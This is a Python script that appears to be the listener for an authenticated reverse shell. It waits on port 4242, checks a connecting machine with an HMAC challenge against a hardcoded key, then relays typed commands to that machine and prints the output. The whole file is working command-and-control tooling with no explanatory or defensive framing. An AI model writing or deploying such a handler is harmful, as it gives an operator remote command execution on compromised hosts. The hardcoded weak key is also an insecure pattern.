import socket, hmac, hashlib, secrets, threading, sys

PSK = b"SuperSecretKey123"

def receiver(conn):
    while True:
        try:
            data = conn.recv(4096)
            if not data: break
            sys.stdout.write(data.decode(errors='replace'))
            sys.stdout.flush()
        except: break

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(('0.0.0.0', 4242))
s.listen(1)
print("Listening on 4242...")

c, addr = s.accept()
print(f"Connection from {addr}")

# 1. Challenge-Response
chal = secrets.token_bytes(32)
c.sendall(chal)
resp = c.recv(32)
expected = hmac.new(PSK, chal, hashlib.sha256).digest()

if hmac.compare_digest(resp, expected):
    c.sendall(b"AUTH_OK")
    print("Authenticated! Dropping into shell...\n")
    
    # 2. Start the receiver thread
    threading.Thread(target=receiver, args=(c,), daemon=True).start()

    # 3. Main loop for sending commands
    try:
        while True:
            cmd = sys.stdin.readline()
            if not cmd: break
            c.sendall(cmd.encode())
    except KeyboardInterrupt:
        pass
else:
    print("Auth Failed.")

c.close()
s.close()